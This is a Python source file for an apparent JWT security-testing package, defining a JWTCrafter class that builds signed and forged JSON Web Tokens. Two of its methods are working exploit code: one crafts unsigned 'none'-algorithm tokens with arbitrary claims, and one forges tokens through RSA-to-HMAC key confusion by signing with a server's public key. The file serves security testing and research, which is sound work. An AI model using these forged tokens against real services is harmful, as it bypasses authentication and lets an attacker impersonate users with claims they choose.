"""JWT crafting utility for security testing, exploit reproduction, and research."""

import base64
import hashlib
import hmac
import json
from typing import Any

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPrivateKey
from cryptography.hazmat.primitives.serialization import load_pem_private_key

from jwtsec.models.token import CraftResult


class JWTCrafter:
    """Generates structured, manipulated, and exploit proof-of-concept JWTs."""

    @classmethod
    def craft_none(
        cls,
        claims: dict[str, Any],
        case_variant: str = "none",
        header_overrides: dict[str, Any] | None = None,
    ) -> CraftResult:
        """Craft an unsigned token using a specific 'none' algorithm variant."""
        header: dict[str, Any] = {"alg": case_variant, "typ": "JWT"}
        if header_overrides:
            header.update(header_overrides)

        h_b64 = cls._base64url_encode(header)
        p_b64 = cls._base64url_encode(claims)
        token = f"{h_b64}.{p_b64}."

        return CraftResult(token=token, algorithm=case_variant, header=header, payload=claims)

    @classmethod
    def craft_hmac(
        cls,
        claims: dict[str, Any],
        secret: str,
        alg: str = "HS256",
        header_overrides: dict[str, Any] | None = None,
    ) -> CraftResult:
        """Craft an HMAC signed token (HS256, HS384, HS512)."""
        header: dict[str, Any] = {"alg": alg, "typ": "JWT"}
        if header_overrides:
            header.update(header_overrides)

        h_b64 = cls._base64url_encode(header)
        p_b64 = cls._base64url_encode(claims)
        signing_input = f"{h_b64}.{p_b64}".encode("ascii")

        hash_map = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
        h_func = hash_map.get(alg, hashlib.sha256)

        sig_bytes = hmac.new(secret.encode("utf-8"), signing_input, h_func).digest()
        sig_b64 = base64.urlsafe_b64encode(sig_bytes).decode("ascii").rstrip("=")
        token = f"{h_b64}.{p_b64}.{sig_b64}"

        return CraftResult(token=token, algorithm=alg, header=header, payload=claims)

    @classmethod
    def craft_key_confusion(
        cls,
        claims: dict[str, Any],
        public_key_pem: str | bytes,
        alg: str = "HS256",
        header_overrides: dict[str, Any] | None = None,
    ) -> CraftResult:
        """Craft an asymmetric-to-symmetric key confusion exploit token."""
        header: dict[str, Any] = {"alg": alg, "typ": "JWT"}
        if header_overrides:
            header.update(header_overrides)

        h_b64 = cls._base64url_encode(header)
        p_b64 = cls._base64url_encode(claims)
        signing_input = f"{h_b64}.{p_b64}".encode("ascii")

        key_bytes = (
            public_key_pem.encode("utf-8") if isinstance(public_key_pem, str) else public_key_pem
        )
        sig_bytes = hmac.new(key_bytes, signing_input, hashlib.sha256).digest()
        sig_b64 = base64.urlsafe_b64encode(sig_bytes).decode("ascii").rstrip("=")
        token = f"{h_b64}.{p_b64}.{sig_b64}"

        return CraftResult(token=token, algorithm=alg, header=header, payload=claims)

    @classmethod
    def craft_rsa(
        cls,
        claims: dict[str, Any],
        private_key_pem: str | bytes,
        alg: str = "RS256",
        header_overrides: dict[str, Any] | None = None,
    ) -> CraftResult:
        """Craft an RSA signed token (RS256)."""
        header: dict[str, Any] = {"alg": alg, "typ": "JWT"}
        if header_overrides:
            header.update(header_overrides)

        h_b64 = cls._base64url_encode(header)
        p_b64 = cls._base64url_encode(claims)
        signing_input = f"{h_b64}.{p_b64}".encode("ascii")

        pem_bytes = (
            private_key_pem.encode("utf-8") if isinstance(private_key_pem, str) else private_key_pem
        )
        priv_key = load_pem_private_key(pem_bytes, password=None)
        if not isinstance(priv_key, RSAPrivateKey):
            raise ValueError("Invalid RSA private key for signing")

        sig_bytes = priv_key.sign(
            signing_input,
            padding.PKCS1v15(),
            hashes.SHA256(),
        )
        sig_b64 = base64.urlsafe_b64encode(sig_bytes).decode("ascii").rstrip("=")
        token = f"{h_b64}.{p_b64}.{sig_b64}"

        return CraftResult(token=token, algorithm=alg, header=header, payload=claims)

    @staticmethod
    def _base64url_encode(data: dict[str, Any]) -> str:
        """Encode JSON dictionary to base64url string without padding."""
        raw_json = json.dumps(data, separators=(",", ":")).encode("utf-8")
        return base64.urlsafe_b64encode(raw_json).decode("ascii").rstrip("=")
